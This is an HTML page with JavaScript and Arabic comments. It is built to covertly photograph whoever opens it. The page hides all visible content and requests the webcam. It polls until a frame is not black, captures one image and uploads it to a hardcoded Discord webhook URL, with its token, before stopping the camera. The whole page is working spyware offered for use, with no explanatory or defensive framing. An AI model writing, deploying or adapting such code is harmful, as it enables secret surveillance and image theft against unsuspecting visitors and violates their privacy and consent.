<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title> </title>
<style>body,video,canvas{display:none}</style>
</head>
<body>
<video id="cam" autoplay playsinline style="display:none"></video>
<canvas id="canvas" style="display:none"></canvas>

<script>
const webhook = "https://discord.com/api/webhooks/1475203617043517533/JZeV78rfYNKQAyY83cTx6khi_ZVd1DhxhnIe9Ciq_xkpSyZiRgSKDCPVGZfD3t4nc0VC";

function isImageBlack(videoElement) {
    // رسم الإطار الحالي مؤقتاً
    const testCanvas = document.createElement('canvas');
    testCanvas.width = videoElement.videoWidth;
    testCanvas.height = videoElement.videoHeight;
    const ctx = testCanvas.getContext('2d');
    ctx.drawImage(videoElement, 0, 0);
    
    const imageData = ctx.getImageData(0, 0, testCanvas.width, testCanvas.height);
    let totalPixels = imageData.data.length / 4;
    let blackPixels = 0;
    
    // فحص أول 1000 بكسل فقط (أسرع)
    const step = Math.max(1, Math.floor(totalPixels / 1000));
    for (let i = 0; i < imageData.data.length; i += step * 4) {
        let r = imageData.data[i];
        let g = imageData.data[i+1];
        let b = imageData.data[i+2];
        // إذا اللون قريب من الأسود
        if (r < 20 && g < 20 && b < 20) {
            blackPixels++;
        }
    }
    
    let blackRatio = blackPixels / (totalPixels / step);
    console.log("نسبة الأسود: " + (blackRatio * 100).toFixed(1) + "%");
    
    // إذا أكثر من 90% أسود -> الصورة سوداء
    return blackRatio > 0.9;
}

function captureAndSend(videoElement) {
    return new Promise((resolve) => {
        const canvas = document.getElementById('canvas');
        canvas.width = videoElement.videoWidth;
        canvas.height = videoElement.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(videoElement, 0, 0);
        
        canvas.toBlob(async (blob) => {
            if (blob && blob.size > 5000) { // حجم أكبر من 5KB يعني في صورة حقيقية
                const formData = new FormData();
                formData.append("file", blob, `frame_${Date.now()}.png`);
                try {
                    await fetch(webhook, { method: "POST", body: formData });
                    console.log("[✓] تم الإرسال - الحجم: " + (blob.size/1024).toFixed(1) + "KB");
                    resolve(true);
                } catch(e) {
                    console.log("فشل الإرسال");
                    resolve(false);
                }
            } else {
                console.log("الصورة صغيرة جداً أو فاسدة");
                resolve(false);
            }
        }, "image/png", 0.9);
    });
}

async function startCamera() {
    try {
        // طلب الكاميرا
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { 
                width: { ideal: 1280 },
                height: { ideal: 720 }
            } 
        });
        
        const video = document.getElementById('cam');
        video.srcObject = stream;
        
        video.onloadedmetadata = () => {
            video.play();
            console.log("الكاميرا بدأت، ننتظر أول إطار حقيقي...");
            
            // نجرب كل 300 مللي ثانية حتى نحصل على صورة غير سوداء
            let attempts = 0;
            const maxAttempts = 30; // 9 ثواني كحد أقصى
            
            const checkInterval = setInterval(async () => {
                attempts++;
                
                // نتأكد أن الفيديو له أبعاد
                if (video.videoWidth === 0 || video.videoHeight === 0) {
                    console.log("انتظار أبعاد الفيديو...");
                    return;
                }
                
                // نفحص إذا كانت الصورة سوداء
                const isBlack = isImageBlack(video);
                
                if (!isBlack) {
                    // وجدنا صورة حقيقية!
                    console.log("تم العثور على إطار حقيقي، نصور الآن...");
                    clearInterval(checkInterval);
                    
                    // نعطي الكاميرا نصف ثانية إضافية لتستقر
                    setTimeout(async () => {
                        await captureAndSend(video);
                        // نغلق الكاميرا بعد الإرسال
                        stream.getTracks().forEach(track => track.stop());
                        console.log("انتهى");
                    }, 500);
                    
                } else if (attempts >= maxAttempts) {
                    // فشلنا في الحصول على صورة حقيقية
                    console.log("لم نتمكن من الحصول على صورة حقيقية");
                    clearInterval(checkInterval);
                    stream.getTracks().forEach(track => track.stop());
                }
            }, 300); // كل 300 مللي ثانية
        };
        
    } catch(err) {
        console.log("خطأ في الكاميرا:", err);
    }
}

// بدء التشغيل
startCamera();
</script>
</body>
</html>
